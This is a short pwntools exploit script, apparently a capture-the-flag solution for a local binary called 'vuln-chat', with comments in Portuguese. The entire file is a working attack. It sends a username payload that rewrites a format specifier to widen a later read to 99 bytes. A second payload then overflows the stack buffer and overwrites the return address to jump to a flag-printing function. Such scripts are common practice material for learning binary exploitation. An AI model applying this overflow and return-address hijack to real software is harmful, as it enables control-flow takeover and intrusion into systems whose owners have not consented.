from pwn import * 

p=process("./vuln-chat")
#stack[-0x9] buffer -> le 30 bytes
#stack[-0x1d] username
#stack[-0x31] password

#0x31-0x1d = 20
#0x1d-0x9 = 20


payload1 =""
payload1 += "A" * 20 #username 
payload1 += "%99s" #overwrite buffer para aceitar 99 carateres ao inves de 30 
p.sendafter("username: ",payload1)

pause()
payload2 = ""
payload2 += "A" * 49 #0x31 
payload2 += p32(0x804856b) #print flag
p.send(payload2)

pause()


p.interactive()
